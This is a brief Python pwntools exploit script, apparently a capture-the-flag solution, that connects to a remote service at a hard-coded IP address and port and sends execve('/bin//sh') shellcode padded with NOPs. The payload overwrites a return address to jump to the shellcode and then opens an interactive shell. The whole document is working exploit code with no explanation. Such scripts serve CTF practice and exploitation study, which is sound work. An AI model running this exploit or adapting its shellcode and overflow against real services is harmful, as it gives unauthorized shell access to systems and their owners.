from pwn import *
context.binary = ELF('./jmp_shell')
context.log_level = 'debug'


def dbg():
	gdb.attach(p, 'b* 0x400705')
	raw_input()

mov_rsp = 0x40070b

#p = process('./jmp_shell')
p = remote('47.106.94.13', 50011)

shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
shellcode = shellcode.ljust(0x28, '\x90')
shellcode += p64(mov_rsp)

#dbg()
p.sendafter('0day!', shellcode)



p.interactive()
p.close()